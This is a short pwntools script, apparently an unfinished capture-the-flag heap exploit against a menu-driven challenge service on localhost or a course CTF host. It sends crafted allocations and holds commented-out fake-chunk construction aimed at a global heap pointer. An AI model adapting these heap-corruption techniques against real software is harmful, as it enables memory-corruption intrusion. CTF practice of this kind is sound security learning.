from pwn import *
context.arch = 'amd64'

#r = remote('csie.ctf.tw',10138)
r = remote('localhost',8888)
#r.interactive()
def allocate(size,data):
    r.sendline('1')
    r.recvuntil('Size :')
    r.send(str(size))
    r.recvuntil('Data :')
    r.send(data)
def show():
    r.sendline('2')
    r.recvuntil(':')
#add
heap = 0x602050             #the addr of heap variable   
allocate(0x38,'b' * 0x30 + p64(0) )
allocate(0x30000,'b' * 0x30 + p64(0) )

'''
allocate(0x38,'b' * 0x30 + p64(0) )
#fake chunk
allocate(0x20d00,'b' * 0x38)
allocate(0x200,'a' * 0xa0)
#f1 = flat([0x00,0xf1,heap - 0x18,heap-0x10]) + 'x'*0xd0 + flat([0xf0,0xf1])
#allocate(0xf8,f1)
#allocate(heap,'a')
'''
r.interactive()
